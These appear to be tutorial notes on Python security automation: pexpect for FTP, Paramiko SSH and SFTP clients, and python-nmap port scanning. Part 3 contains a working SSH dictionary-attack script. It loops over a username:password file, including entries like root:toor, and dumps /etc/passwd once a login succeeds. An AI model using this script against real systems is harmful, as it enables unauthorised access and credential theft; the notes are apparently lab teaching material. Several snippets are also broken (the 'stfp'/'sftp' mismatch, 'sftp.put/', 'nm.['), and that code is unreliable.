Part 1: Using pexpect 

Expect and Pexpect 

	• Expect is an automation tool allows you to interact with applications and automate tasks
	• It's been in the UNIX/Linux world for quite a bit 
	• Pexpect is the Python module for Expect 

	# ftp localhost 
		Name: demo
		Password: demo123
	Ftp> ls 
	
	# vim ftp-pexpect.py 
	-----------
	#!/usr/bin/env python 
	
	import pexpect
	
	id = pexpect.spawn('ftp localhost')
	
	id.expect_exact('Name')
	id.sendline('demo')
	
	id.expect_exact('Password')
	id.sendline('demo123')
	
	id.expect_exact('ftp')
	id.sendline('ls')
	
	id.expect_exact('ftp')
	lines = id.before.split('\n')
	
	for line in lines :
		print line 
	-----------

Exercise 

	• Explore other modules available for automation of an SSH login process


Part 2: SSH Automation with Paramiko 

Paramiko 

	• Allows for easy creation of SSH and SFTP clients 
	• Just 5 lines of code to create an SSH client :) 
	• You can also create the same with pexpect and other modules 

	# sudo easy_install paramiko
	
	# vim ssh.py 
	------------
	#!/usr/bin/env python 
	
	import paramiko
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	ssh.connect('localhost', username='demo', password='demo123')
	
	stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
	
	for line in stdout.readlines() :
		print line.strip()
		
	ssh.close() 
	------------


Part 3: SSH Dictionary Attack with Paramiko 

SSH Dictionary Attack with Paramiko

	• Take the previous program 
	• Create a loop in the connect()
	• Read from a file (username:pass) combination
	• Try for each 

	# vim ssh.py 
	------------
	#!/usr/bin/env python 
	
	import paramiko
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	ssh.connect('localhost', username='emo', password='demo123')
	
	stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
	
	for line in stdout.readlines() :
		print line.strip()
		
	ssh.close() 
	------------
	
	Let's give an invalid username and see how it responds. 
	
	# ./ssh.py
	-> paramiko.AuthenticationException: Authentication failed. 
	
	# cp ssh.py ssh-dict.py 
	# vim ssh-dict.py
	
	------------
	#!/usr/bin/env python 
	
	import paramiko
	import sys 
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	fd = open(sys.argv[1], "r")
	
	# assume the user-pass file is of the form username:password\n
	
	for line in fd.readlines() :
		user_pass = line.strip().split(':')
		
		try :
			ssh.connect('localhost', username=user_pass[0], password=user_pass[1])
		except paramiko.AuthenticationException:
			print '[-] Username %s and Password %s is Incorrect!' % (user_pass[0], user_pass[1])
		else:
			print '[+] Username %s and Password %s is Correct!!!' % (user_pass[0], user_pass[1])
			
			stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
				
			for line in stdout.readlines() :
				print line.strip()
			break 
			
	ssh.close() 
	------------
	
	# vim upass
	------------
	demo:123
	abc:123
	root:toor
	melih:password
	demo:demo123
	fluff=fluff
	------------
	
	# chmod a+x ssh-dict.py 
	# ./ssh-dict.py upass


Part 4: SFTP with Paramiko

SFTP 

	• Is a subsystem and typically uses a SSH transport layer underneath
	• Extremely easy to get an SFTP connection using the SSH connection
	• Can automate remote file uploads/downloads 


	# cp ssh.py sftp.py 
	
	#vim sftp.py 
	------------
	#!/usr/bin/env python 
	
	import paramiko
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	ssh.connect('localhost', username='demo', password='demo123')
	
	stfp = ssh.open_sftp()
	print sftp.listdir() 
	
	sftp.chdir('/')
	print sftp.listdir() 
	
	ssh.close() 
	------------
	# chmod a+x sftp.py
	#. /sftp.py 
	
	# vim sftp.py 
	------------
	#!/usr/bin/env python 
	
	import paramiko
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	ssh.connect('localhost', username='demo', password='demo123')
	
	stfp = ssh.open_sftp()
	
	sftp.put/'upass', 'upass-copy')
	
	ssh.close() 
	------------
	
	#. /sftp.py 
	
	# ssh demo@192.168.56.102 
	$ ls
	$ cat upass-copy
	$cat passwd 
	
	# vim sftp.py 
	------------
	#!/usr/bin/env python 
	
	import paramiko
	
	ssh = paramiko.SSHClient()
	
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
	ssh.connect('localhost', username='demo', password='demo123')
	
	stfp = ssh.open_sftp()
	
	sftp.get('passwd', 'passwd-copy')
	
	ssh.close() 
	------------
	#. /sftp.py 
	
	# cat password-copy 


Part 5: Automating Nmap 

Nmap Automation 

	• Can automate using pexpect or subprocess
	• You can use the Python-Nmap library
	• Install nmap and python-nmap library 

	http://xael.org/norman/python/python-nmap/ 
	
	# python
	>>> import nmap 
	>>> nm = nmap.PortScanner()
	>>> nm.scan('127.0.0.1', '22-443') 
	
	>>> nm.command_line()
	>>> nm.scaninfo() 
	
	>>> nm['127.0.0.1'].all_protocols() 
	>>> nm.['127.0.0.1']['tcp'].keys() 
	
	>>> nm.['127.0.01']['tcp'][22]